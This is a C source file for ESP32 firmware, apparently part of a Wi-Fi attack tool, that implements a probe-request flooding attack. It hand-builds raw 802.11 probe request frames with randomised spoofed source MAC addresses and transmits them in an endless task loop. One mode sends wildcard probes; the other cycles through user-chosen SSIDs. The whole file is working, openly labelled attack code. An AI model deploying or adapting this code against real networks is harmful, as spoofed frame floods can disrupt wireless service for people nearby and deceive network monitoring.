#include <stdlib.h>
#include "esp_err.h"
#include "esp_wifi_types.h"
#include "probe.h"

uint8_t probe_raw[] = {
    /*IEEE 802.11 Probe Request*/
	0x40, 0x00, //Frame Control version=0 type=0(management)  subtype=100 (probe request)
	0x00, 0x00, //Duration
	0xff, 0xff, 0xff, 0xff, 0xff, 0xff, //A1 Destination address  broadcast
	0x50, 0x02, 0x91, 0x90, 0x0c, 0x70, //A2 Source address (STA Mac i.e. transmitter address)
	0xff, 0xff, 0xff, 0xff, 0xff, 0xff, //A3 BSSID
	0x30, 0x9e, //sequence number (This would be overwritten if 'en_sys_seq' is set to true in fn call esp_wifi_80211_tx )

	/*IEEE 802.11 Wireless Management*/
	/*Tagged Paramneters*/
	/*Tag: SSID parameter set: Wildcard SSID*/
	0x00,	//ssid.element_id
	0x00,	//ssid.length
                //ssid.name

	/*Tag: Supported Rates 5.5(B), 11(B), 1(B), 2(B), 6, 12, 24, 48, [Mbit/sec]*/
	0x01,	//wlan.tag.number => 1
	0x08,	//wlan.tag.length => 8
	0x8b,	//Supported Rates: 5.5(B) (0x8b)	(wlan.supported_rates)
	0x96,	//Supported Rates: 11(B) (0x96)		(wlan.supported_rates)
	0x82,	//Supported Rates: 1(B) (0x82)		(wlan.supported_rates)
	0x84,	//Supported Rates: 2(B) (0x84)		(wlan.supported_rates)
	0x0c,	//Supported Rates: 6 (0x0c)			(wlan.supported_rates)
	0x18,	//Supported Rates: 12 (018)			(wlan.supported_rates)
	0x30,	//Supported Rates: 24 (0x30)		(wlan.supported_rates)
	0x60,	//Supported Rates: 48 (0x60)		(wlan.supported_rates)

	/*Tag: Extended Supported Rates 54, 9, 18, 36, [Mbit/sec]*/

	0x32,	//wlan.tag.number => 50
	0x04,	//wlan.tag.length => 4
	0x6c,	//Extended Supported Rates: 54 (0x6c)	(wlan.extended_supported_rates)
	0x12,	//Extended Supported Rates: 9 (0x12)	(wlan.extended_supported_rates
	0x24,	//Extended Supported Rates: 18 (0x24)	(wlan.extended_supported_rates
	0x48,	//Extended Supported Rates: 36 (0x48)	(wlan.extended_supported_rates

	/*ACTUAL 0x88 0x7d 0x42 0xd4   0x83, 0x2d, 0xbe, 0xce*/ //Frame check sequence: 0x1b8026b0 [unverified] (wlan.fcs)
};

#define SSID_OFFSET 26
#define SRCADDR_OFFSET 10
#define BSSID_OFFSET 16
#define SEQNUM_OFFSET 22

static probe_attack_t attackType = ATTACK_PROBE_NONE;
TaskHandle_t probeTask = NULL;

void probeCallback(void *pvParameter) {
    //
    ESP_LOGI(PROBE_TAG, "Starting probeCallback()");

    // For directed probes we need to track which SSID we're up to
    static int ssid_idx = 0;
    int curr_ssid_len;

    while (true) {
        vTaskDelay(50); // TODO: At least understand how long this is!

        // Create a buffer large enough to store packet + SSID etc.
        uint8_t probeBuffer[200];

        // Build beginning of packet
        memcpy(probeBuffer, probe_raw, SSID_OFFSET - 1);

        // Broadcast or directed packet?
        if (attackType == ATTACK_PROBE_UNDIRECTED) {
            // Append SSID length of 0
            probeBuffer[SSID_OFFSET - 1] = 0;
            curr_ssid_len = 0;
        } else {
            // Find the length of the SSID at ssid_idx
            // The trailing \0 in the SSID string is being ignored because
            //   the null is not included in the packet.
            curr_ssid_len = strlen(user_ssids[ssid_idx]);
            probeBuffer[SSID_OFFSET - 1] = curr_ssid_len;
            memcpy(&probeBuffer[SSID_OFFSET], user_ssids[ssid_idx], curr_ssid_len);
        }
        // Append the rest, beginning from probe_raw[SSID_OFFSET] with
        //   length sizeof(probe_raw)-SSID_OFFSET, to
        //   probeBuffer[SSID_OFFSET + curr_ssid_len]
        memcpy(&probeBuffer[SSID_OFFSET + curr_ssid_len], &probe_raw[SSID_OFFSET], sizeof(probe_raw) - SSID_OFFSET);

        // probeBuffer is now the right size, but needs some attributes set
        // Randomise the 3 least significant bytes of the source MAC
        int addr;
        for (int offset = SRCADDR_OFFSET + 3; offset < SRCADDR_OFFSET + 6; ++offset) {
            addr = rand() % 256;
            probeBuffer[offset] = addr;
        }

        // Use MAC/srcAddr for BSSID - For now at least?
        for (addr = 0; addr < 6; ++addr) {
            probeBuffer[BSSID_OFFSET + addr] = probeBuffer[SRCADDR_OFFSET + addr];
        }

        // Do I need to do anything with sequence numbers?
        // TODO: Check in case of problem - last arg to 80211_tx is en_sys_seq
        //       so I set it to true to see what happens

        // transmit
        esp_wifi_80211_tx(WIFI_IF_AP, probeBuffer, sizeof(probe_raw) + curr_ssid_len, false);
//        esp_wifi_80211_tx(WIFI_IF_AP, probe_raw, sizeof(probe_raw), false);

        // increment ssid
        ++ssid_idx;
        if (ssid_idx >= user_ssid_count) {
            ssid_idx = 0;
        }
    }
}

int probe_stop() {
    #ifdef DEBUG
        ESP_LOGI(PROBE_TAG, "Trace: probe_stop()");
    #endif
    if (probeTask != NULL) {
        ESP_LOGI(PROBE_TAG, "Found a probe task, killing %p", probeTask);
        vTaskDelete(probeTask);
        probeTask = NULL;
    }
    attackType = ATTACK_PROBE_NONE;
    return ESP_OK;
}

int probe_start(probe_attack_t type, int probeCount) {
    char strType[25];
    srand(time(NULL));
    switch (type) {
    case ATTACK_PROBE_UNDIRECTED:
        strcpy(strType, "ATTACK_PROBE_UNDIRECTED");
        break;
    case ATTACK_PROBE_DIRECTED:
        strcpy(strType, "ATTACK_PROBE_DIRECTED");
        break;
    case ATTACK_PROBE_NONE:
        ESP_LOGW(PROBE_TAG, "GRAVITY: Starting an attack of type ATTACK_PROBE_NONE doesn't do very much...");
        return ESP_ERR_INVALID_ARG;
    }
    ESP_LOGI(PROBE_TAG, "Entering probe_start(%s, %d)", strType, probeCount);

    // Stop the existing probe attack if there is one
    if (attackType != ATTACK_PROBE_NONE) {
        ESP_LOGI(PROBE_TAG, "Halting existing %sdirected probe...", (attackType==ATTACK_PROBE_UNDIRECTED)?"un-":"");
        probe_stop();
    }
    attackType = type;

    // The two variations on this attack - directed vs. undirected
    //   probes - have so much similarity that the differences will be
    //   dealt with in lower level functions
    xTaskCreate(&probeCallback, "probeCallback", 2048, NULL, 5, &probeTask);
    return ESP_OK;
}
